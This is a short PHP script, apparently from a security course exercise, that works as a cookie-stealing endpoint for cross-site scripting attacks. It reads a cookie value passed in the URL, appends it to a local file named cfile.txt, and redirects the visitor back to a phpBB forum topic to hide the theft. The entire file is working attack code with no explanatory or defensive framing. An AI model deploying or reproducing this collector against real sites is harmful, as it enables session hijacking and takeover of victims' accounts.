<?php
$cookie = $_GET["cookie"];
$my_file = 'cfile.txt';
$handle = fopen($my_file, 'a');
fwrite($handle, $cookie ."\n");
fclose($handle);
header('Location: http://kalashnik0v.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=6&forum=1');
?>